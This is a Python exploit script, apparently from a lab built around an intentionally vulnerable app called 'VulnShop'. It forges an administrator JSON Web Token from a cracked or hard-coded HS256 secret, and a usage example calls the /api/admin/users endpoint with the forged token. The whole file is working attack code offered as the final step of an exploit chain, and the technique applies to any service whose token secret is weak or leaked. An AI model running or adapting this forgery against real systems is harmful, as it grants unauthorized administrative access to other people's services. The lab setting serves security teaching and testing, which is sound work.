#!/usr/bin/env python3
"""
forge_admin.py — Forge an administrator JWT using the recovered HS256 secret.

This is the final step in the A04:2025 Cryptographic Failures exploit chain.
Once crack_jwt.sh has recovered the secret (or you have read it from
/api/debug/config), this script issues a token that any of the /api/admin/*
endpoints will accept as administrator.

Usage:
    python3 forge_admin.py [--secret SECRET] [--uid 1] [--user admin] [--ttl 3600]

Example:
    $ python3 forge_admin.py
    eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
    $ TOKEN=$(python3 forge_admin.py)
    $ curl -s http://localhost:8000/api/admin/users \\
        -H "Authorization: Bearer $TOKEN" | jq .

Dependencies:
    pip install pyjwt
"""

import argparse
import sys
import time

try:
    import jwt  # PyJWT
except ImportError:
    sys.stderr.write("error: PyJWT not installed.  Run:  pip install pyjwt\n")
    sys.exit(2)


def main() -> int:
    ap = argparse.ArgumentParser(description="Forge an admin JWT for VulnShop.")
    ap.add_argument("--secret", default="secret",
                    help="HS256 signing secret (default: secret — VulnShop's hard-coded value).")
    ap.add_argument("--uid",    type=int, default=1, help="user_id claim (default: 1 = admin).")
    ap.add_argument("--user",   default="admin", help="username claim.")
    ap.add_argument("--ttl",    type=int, default=3600, help="token lifetime in seconds (default: 1h).")
    ap.add_argument("--alg",    default="HS256", help="signing algorithm.")
    args = ap.parse_args()

    payload = {
        "user_id":  args.uid,
        "username": args.user,
        "is_admin": True,
        "exp":      int(time.time()) + args.ttl,
    }
    token = jwt.encode(payload, args.secret, algorithm=args.alg)
    print(token)
    return 0


if __name__ == "__main__":
    sys.exit(main())
